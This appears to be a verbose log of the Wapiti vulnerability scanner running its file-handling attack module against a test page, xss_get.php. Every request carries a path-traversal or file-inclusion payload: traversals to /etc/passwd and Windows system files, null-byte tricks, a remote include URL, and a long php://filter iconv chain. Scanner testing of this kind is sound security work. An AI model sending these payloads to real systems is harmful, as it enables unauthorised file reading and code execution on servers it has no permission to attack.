2024-03-20 16:49:38.225 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=submit (0)
2024-03-20 16:49:47.861 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&lastname=default&form=submit (1)
2024-03-20 16:49:47.879 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&lastname=default&form=submit (1)
2024-03-20 16:49:47.897 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=file%3A%2F%2F%2Fetc%2Fpasswd&lastname=default&form=submit (1)
2024-03-20 16:49:47.915 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&lastname=default&form=submit (1)
2024-03-20 16:49:47.933 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&lastname=default&form=submit (1)
2024-03-20 16:49:47.952 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&lastname=default&form=submit (1)
2024-03-20 16:49:48.023 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&lastname=default&form=submit (1)
2024-03-20 16:49:48.036 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&lastname=default&form=submit (1)
2024-03-20 16:49:48.049 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&lastname=default&form=submit (1)
2024-03-20 16:49:48.062 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&lastname=default&form=submit (1)
2024-03-20 16:49:48.074 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=xss_get.php&lastname=default&form=submit (1)
2024-03-20 16:49:48.084 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=xss_get.php%00&lastname=default&form=submit (1)
2024-03-20 16:49:48.093 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=xss_get.php%3A%3A%24DATA&lastname=default&form=submit (1)
2024-03-20 16:49:48.103 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&form=submit (1)
2024-03-20 16:49:48.112 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&form=submit (1)
2024-03-20 16:49:48.121 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%2Fetc%2Fpasswd&form=submit (1)
2024-03-20 16:49:48.130 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%2Fetc%2Fpasswd%00&form=submit (1)
2024-03-20 16:49:48.139 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%2Fetc%2Fservices&form=submit (1)
2024-03-20 16:49:48.148 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.157 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&form=submit (1)
2024-03-20 16:49:48.166 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&form=submit (1)
2024-03-20 16:49:48.176 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&form=submit (1)
2024-03-20 16:49:48.185 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit (1)
2024-03-20 16:49:48.195 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.204 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&form=submit (1)
2024-03-20 16:49:48.215 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&form=submit (1)
2024-03-20 16:49:48.223 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&form=submit (1)
2024-03-20 16:49:48.232 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form=submit (1)
2024-03-20 16:49:48.241 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form=submit (1)
2024-03-20 16:49:48.250 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&form=submit (1)
2024-03-20 16:49:48.260 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&form=submit (1)
2024-03-20 16:49:48.268 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&form=submit (1)
2024-03-20 16:49:48.277 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&form=submit (1)
2024-03-20 16:49:48.286 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.295 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.304 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit (1)
2024-03-20 16:49:48.313 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit (1)
2024-03-20 16:49:48.322 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.331 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.340 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&form=submit (1)
2024-03-20 16:49:48.349 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form=submit (1)
2024-03-20 16:49:48.359 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form=submit (1)
2024-03-20 16:49:48.368 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&form=submit (1)
2024-03-20 16:49:48.377 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&form=submit (1)
2024-03-20 16:49:48.385 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&form=submit (1)
2024-03-20 16:49:48.394 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&form=submit (1)
2024-03-20 16:49:48.403 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.412 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.429 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit (1)
2024-03-20 16:49:48.443 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit (1)
2024-03-20 16:49:48.458 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.473 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.488 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form=submit (1)
2024-03-20 16:49:48.502 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form=submit (1)
2024-03-20 16:49:48.517 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&form=submit (1)
2024-03-20 16:49:48.531 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&form=submit (1)
2024-03-20 16:49:48.546 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&form=submit (1)
2024-03-20 16:49:48.560 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&form=submit (1)
2024-03-20 16:49:48.574 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.588 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.602 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit (1)
2024-03-20 16:49:48.611 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit (1)
2024-03-20 16:49:48.621 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.630 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.639 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=file%3A%2F%2F%2Fetc%2Fpasswd&form=submit (1)
2024-03-20 16:49:48.649 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&form=submit (1)
2024-03-20 16:49:48.659 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&form=submit (1)
2024-03-20 16:49:48.668 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&form=submit (1)
2024-03-20 16:49:48.677 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&form=submit (1)
